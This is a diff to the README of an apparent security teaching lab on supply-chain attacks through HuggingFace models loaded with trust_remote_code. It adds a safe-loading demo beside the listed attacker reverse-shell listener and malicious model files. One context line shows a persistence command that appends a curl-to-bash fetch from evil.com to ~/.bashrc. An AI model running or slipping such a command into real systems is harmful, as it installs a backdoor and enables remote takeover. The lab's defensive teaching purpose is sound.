@@ -33,7 +33,8 @@ When `trust_remote_code=True` is set:
 ```
 lab-06-supply-chain-attack/
 ├── 1_attacker_listener.py        # Attacker's reverse shell listener
-├── 2_victim_loads_model.py       # Victim's "innocent" Q&A chatbot
+├── 2_victim_loads_model.py       # Victim's "innocent" Q&A chatbot (VULNERABLE)
+├── 3_safe_model_loading.py       # Safe model loading demo (SECURE)
 ├── malicious_model/              # Fake HuggingFace model
 │   ├── config.json               # Points to malicious code
 │   └── reverse_shell_payload.py  # Hidden reverse shell + Q&A model
@@ -257,7 +258,20 @@ echo 'curl http://evil.com/backdoor.sh | bash' >> ~/.bashrc
 | **Use containers** | Sandbox isolates damage |
 | **Network segmentation** | Block outbound connections |
 
-### Safe Loading Example
+### Safe Loading Demo
+
+Run the safe version to compare:
+
+```bash
+python 3_safe_model_loading.py
+```
+
+This demonstrates the same Q&A functionality **without** the vulnerability:
+- ✅ No `trust_remote_code=True`
+- ✅ Uses verified model from Google
+- ✅ No reverse shell, no backdoor
+
+### Safe Code Example
 
 ```python
 from transformers import AutoModel
